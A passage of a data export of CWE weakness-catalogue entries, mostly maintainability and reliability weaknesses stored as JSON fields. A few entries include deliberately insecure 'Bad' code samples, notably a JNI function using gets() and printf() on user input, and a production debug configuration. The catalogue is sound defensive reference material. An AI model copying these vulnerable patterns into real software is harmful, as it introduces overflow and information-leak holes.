This issue can prevent the product from running reliably, due to incorrect or unexpected comparison results.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Persistent Storable Data Element without Associated Comparison Control Element"", ""cwe_id"": ""CWE-1097"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product uses a storable data element that does not have\n\t\t\t\t\tall of the associated functions or methods that are necessary to support\n\t\t\t\t\tcomparison."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""For example, with Java, a class that is made persistent requires both hashCode() and equals() methods to be defined.\nThis issue can prevent the product from running reliably, due to incorrect or unexpected comparison results.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.""}"
"CWE-1098","Data Element containing Pointer Item without Proper Copy Control Element","The code contains a data element with a pointer that does not have an associated copy or constructor method.","This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Data Element containing Pointer Item without Proper Copy Control Element"", ""cwe_id"": ""CWE-1098"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The code contains a data element with a pointer that does not have an associated copy or constructor method."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.""}"
"CWE-1099","Inconsistent Naming Conventions for Identifiers","The product's code, documentation, or other artifacts do not
					consistently use the same naming conventions for variables, callables, groups of
					related callables, I/O capabilities, data types, file names, or similar types of
					elements.","This issue makes it more difficult to understand and/or maintain the product due to inconsistencies, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[]","[]","[]","[]","","{""name"": ""Inconsistent Naming Conventions for Identifiers"", ""cwe_id"": ""CWE-1099"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product's code, documentation, or other artifacts do not\n\t\t\t\t\tconsistently use the same naming conventions for variables, callables, groups of\n\t\t\t\t\trelated callables, I/O capabilities, data types, file names, or similar types of\n\t\t\t\t\telements."", ""mitigations"": [], ""consequences"": [], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to understand and/or maintain the product due to inconsistencies, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-11","ASP.NET Misconfiguration: Creating Debug Binary","Debugging messages help attackers learn about the system and plan a form of attack.","ASP .NET applications can be configured to produce debug binaries. These binaries give detailed debugging messages and should not be used in production environments. Debug binaries are meant to be used in a development or testing environment and can pose a security risk if they are deployed to production.","Variant","Draft","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": ""Attackers can leverage the additional information they gain from debugging output to mount attacks targeted on the framework, database, or other resources used by the application."", ""scope"": ""Confidentiality"", ""impact"": ""Read Application Data""}]","[{""phases"": ""System Configuration"", ""strategy"": """", ""description"": ""Avoid releasing debug binaries into the production environment. Change the debug mode to false when the application is deployed into production."", ""effectiveness"": null}]","[{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""<?xml version=\""1.0\"" encoding=\""utf-8\"" ?><configuration><system.web><compilationdefaultLanguage=\""c#\""debug=\""true\""/>...</system.web></configuration>"", ""language"": ""Bad""}]}]","","{""name"": ""ASP.NET Misconfiguration: Creating Debug Binary"", ""cwe_id"": ""CWE-11"", ""status"": ""Draft"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""<?xml version=\""1.0\"" encoding=\""utf-8\"" ?><configuration><system.web><compilationdefaultLanguage=\""c#\""debug=\""true\""/>...</system.web></configuration>"", ""language"": ""Bad""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Variant"", ""description"": ""Debugging messages help attackers learn about the system and plan a form of attack."", ""mitigations"": [{""phases"": ""System Configuration"", ""strategy"": """", ""description"": ""Avoid releasing debug binaries into the production environment. Change the debug mode to false when the application is deployed into production."", ""effectiveness"": null}], ""consequences"": [{""note"": ""Attackers can leverage the additional information they gain from debugging output to mount attacks targeted on the framework, database, or other resources used by the application."", ""scope"": ""Confidentiality"", ""impact"": ""Read Application Data""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Avoid releasing debug binaries into the production environment. Change the debug mode to false when the application is deployed into production."", ""detection_methods"": [{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}], ""extended_description"": ""ASP .NET applications can be configured to produce debug binaries. These binaries give detailed debugging messages and should not be used in production environments. Debug binaries are meant to be used in a development or testing environment and can pose a security risk if they are deployed to production.""}"
"CWE-110","Struts: Validator Without Form Field","Validation fields that do not appear in forms they are associated with indicate that the validation logic is out of date.","It is easy for developers to forget to update validation logic when they make changes to an ActionForm class. One indication that validation logic is not being properly maintained is inconsistencies between the action form and the validation form.
            Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.","Variant","Draft","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": ""It is critically important that validation logic be maintained and kept in sync with the rest of the application. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation."", ""scope"": ""Other"", ""impact"": ""Other""}]","[]","[{""method"": null, ""description"": ""To find the issue in the implementation, manual checks or automated static analysis could be applied to the XML configuration files."", ""effectiveness"": null}, {""method"": null, ""description"": ""To find the issue in the implementation, manual checks or automated static analysis could be applied to the XML configuration files."", ""effectiveness"": null}]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class DateRangeForm extends ValidatorForm {String startDate, endDate;\n                           public void setStartDate(String startDate) {this.startDate = startDate;}\n                           public void setEndDate(String endDate) {this.endDate = endDate;}}"", ""language"": ""Bad""}, {""code"": ""<form name=\""DateRangeForm\""><field property=\""startDate\"" depends=\""date\""><arg0 key=\""start.date\""/></field><field property=\""endDate\"" depends=\""date\""><arg0 key=\""end.date\""/></field><field property=\""scale\"" depends=\""integer\""><arg0 key=\""range.scale\""/></field></form>"", ""language"": ""Bad""}]}]","","{""name"": ""Struts: Validator Without Form Field"", ""cwe_id"": ""CWE-110"", ""status"": ""Draft"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class DateRangeForm extends ValidatorForm {String startDate, endDate;\n                           public void setStartDate(String startDate) {this.startDate = startDate;}\n                           public void setEndDate(String endDate) {this.endDate = endDate;}}"", ""language"": ""Bad""}, {""code"": ""<form name=\""DateRangeForm\""><field property=\""startDate\"" depends=\""date\""><arg0 key=\""start.date\""/></field><field property=\""endDate\"" depends=\""date\""><arg0 key=\""end.date\""/></field><field property=\""scale\"" depends=\""integer\""><arg0 key=\""range.scale\""/></field></form>"", ""language"": ""Bad""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Variant"", ""description"": ""Validation fields that do not appear in forms they are associated with indicate that the validation logic is out of date."", ""mitigations"": [], ""consequences"": [{""note"": ""It is critically important that validation logic be maintained and kept in sync with the rest of the application. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation."", ""scope"": ""Other"", ""impact"": ""Other""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [{""method"": null, ""description"": ""To find the issue in the implementation, manual checks or automated static analysis could be applied to the XML configuration files."", ""effectiveness"": null}, {""method"": null, ""description"": ""To find the issue in the implementation, manual checks or automated static analysis could be applied to the XML configuration files."", ""effectiveness"": null}], ""extended_description"": ""It is easy for developers to forget to update validation logic when they make changes to an ActionForm class. One indication that validation logic is not being properly maintained is inconsistencies between the action form and the validation form.\n            Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.""}"
"CWE-1100","Insufficient Isolation of System-Dependent Functions","The product or code does not isolate system-dependent
					functionality into separate standalone modules.","This issue makes it more difficult to maintain and/or port the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Insufficient Isolation of System-Dependent Functions"", ""cwe_id"": ""CWE-1100"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product or code does not isolate system-dependent\n\t\t\t\t\tfunctionality into separate standalone modules."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain and/or port the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1101","Reliance on Runtime Component in Generated Code","The product uses automatically-generated code that cannot be
					executed without a specific runtime support component.","This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Reliance on Runtime Component in Generated Code"", ""cwe_id"": ""CWE-1101"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product uses automatically-generated code that cannot be\n\t\t\t\t\texecuted without a specific runtime support component."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1102","Reliance on Machine-Dependent Data Representation","The code uses a data representation that relies on low-level
					data representation or constructs that may vary across different processors,
					physical machines, OSes, or other physical components.","This issue makes it more difficult to maintain and/or port the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Reliance on Machine-Dependent Data Representation"", ""cwe_id"": ""CWE-1102"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The code uses a data representation that relies on low-level\n\t\t\t\t\tdata representation or constructs that may vary across different processors,\n\t\t\t\t\tphysical machines, OSes, or other physical components."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain and/or port the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1103","Use of Platform-Dependent Third Party Components","The product relies on third-party components that do
					not provide equivalent functionality across all desirable
					platforms.","This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Use of Platform-Dependent Third Party Components"", ""cwe_id"": ""CWE-1103"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product relies on third-party components that do\n\t\t\t\t\tnot provide equivalent functionality across all desirable\n\t\t\t\t\tplatforms."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1104","Use of Unmaintained Third Party Components","The product relies on third-party components that are not
					actively supported or maintained by the original developer or a trusted proxy
					for the original developer.","Reliance on components that are no longer maintained can make it difficult or impossible to fix significant bugs, vulnerabilities, or quality issues. In effect, unmaintained code can become obsolete.
This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Use of Unmaintained Third Party Components"", ""cwe_id"": ""CWE-1104"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product relies on third-party components that are not\n\t\t\t\t\tactively supported or maintained by the original developer or a trusted proxy\n\t\t\t\t\tfor the original developer."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""Reliance on components that are no longer maintained can make it difficult or impossible to fix significant bugs, vulnerabilities, or quality issues. In effect, unmaintained code can become obsolete.\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1105","Insufficient Encapsulation of Machine-Dependent Functionality","The product or code uses machine-dependent functionality, but
					it does not sufficiently encapsulate or isolate this functionality from
					the rest of the code.","This issue makes it more difficult to port or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""void example() {char a;char b;*(&a + 1) = 0;}"", ""language"": ""Bad""}]}]","","{""name"": ""Insufficient Encapsulation of Machine-Dependent Functionality"", ""cwe_id"": ""CWE-1105"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""void example() {char a;char b;*(&a + 1) = 0;}"", ""language"": ""Bad""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product or code uses machine-dependent functionality, but\n\t\t\t\t\tit does not sufficiently encapsulate or isolate this functionality from\n\t\t\t\t\tthe rest of the code."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to port or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1106","Insufficient Use of Symbolic Constants","The source code uses literal constants that may need to change
					or evolve over time, instead of using symbolic constants.","This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Insufficient Use of Symbolic Constants"", ""cwe_id"": ""CWE-1106"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The source code uses literal constants that may need to change\n\t\t\t\t\tor evolve over time, instead of using symbolic constants."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1107","Insufficient Isolation of Symbolic Constant Definitions","The source code uses symbolic constants, but it does not
					sufficiently place the definitions of these constants into a more centralized or
					isolated location.","This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Insufficient Isolation of Symbolic Constant Definitions"", ""cwe_id"": ""CWE-1107"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The source code uses symbolic constants, but it does not\n\t\t\t\t\tsufficiently place the definitions of these constants into a more centralized or\n\t\t\t\t\tisolated location."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1108","Excessive Reliance on Global Variables","The code is structured in a way that relies too much on using
					or setting global variables throughout various points in the code, instead of
					preserving the associated information in a narrower, more local
					context.","This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}]","[]","","{""name"": ""Excessive Reliance on Global Variables"", ""cwe_id"": ""CWE-1108"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The code is structured in a way that relies too much on using\n\t\t\t\t\tor setting global variables throughout various points in the code, instead of\n\t\t\t\t\tpreserving the associated information in a narrower, more local\n\t\t\t\t\tcontext."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}], ""extended_description"": ""This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1109","Use of Same Variable for Multiple Purposes","The code contains a callable, block, or other code element in
					which the same variable is used to control more than one unique task or store
					more than one instance of data.","Use of the same variable for multiple purposes can make it more difficult for a person to read or understand the code, potentially hiding other quality issues.
This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Use of Same Variable for Multiple Purposes"", ""cwe_id"": ""CWE-1109"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The code contains a callable, block, or other code element in\n\t\t\t\t\twhich the same variable is used to control more than one unique task or store\n\t\t\t\t\tmore than one instance of data."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""Use of the same variable for multiple purposes can make it more difficult for a person to read or understand the code, potentially hiding other quality issues.\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-111","Direct Use of Unsafe JNI","When a Java application uses the Java Native Interface (JNI) to call code written in another programming language, it can expose the application to weaknesses in that code, even if those weaknesses cannot occur in Java.","Many safety features that programmers may take for granted do not apply for native code, so you must carefully review all such code for potential problems. The languages used to implement native code may be more susceptible to buffer overflows and other attacks. Native code is unprotected by the security features enforced by the runtime environment, such as strong typing and array bounds checking.","Variant","Draft","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Access Control"", ""impact"": ""Bypass Protection Mechanism""}]","[{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Implement error handling around the JNI call."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": ""Refactoring"", ""description"": ""Do not use JNI calls if you don't trust the native library."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": ""Refactoring"", ""description"": ""Be reluctant to use JNI calls. A Java API equivalent may exist."", ""effectiveness"": null}]","[{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""class Echo {public native void runEcho();static {System.loadLibrary(\""echo\"");}public static void main(String[] args) {new Echo().runEcho();}}"", ""language"": ""Bad""}, {""code"": ""#include <jni.h>#include \""Echo.h\""//the java class above compiled with javah#include <stdio.h>\n                     JNIEXPORT void JNICALLJava_Echo_runEcho(JNIEnv *env, jobject obj){char buf[64];gets(buf);printf(buf);}"", ""language"": ""Bad""}]}]","","{""name"": ""Direct Use of Unsafe JNI"", ""cwe_id"": ""CWE-111"", ""status"": ""Draft"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""class Echo {public native void runEcho();static {System.loadLibrary(\""echo\"");}public static void main(String[] args) {new Echo().runEcho();}}"", ""language"": ""Bad""}, {""code"": ""#include <jni.h>#include \""Echo.h\""//the java class above compiled with javah#include <stdio.h>\n                     JNIEXPORT void JNICALLJava_Echo_runEcho(JNIEnv *env, jobject obj){char buf[64];gets(buf);printf(buf);}"", ""language"": ""Bad""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Variant"", ""description"": ""When a Java application uses the Java Native Interface (JNI) to call code written in another programming language, it can expose the application to weaknesses in that code, even if those weaknesses cannot occur in Java."", ""mitigations"": [{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Implement error handling around the JNI call."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": ""Refactoring"", ""description"": ""Do not use JNI calls if you don't trust the native library."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": ""Refactoring"", ""description"": ""Be reluctant to use JNI calls. A Java API equivalent may exist."", ""effectiveness"": null}], ""consequences"": 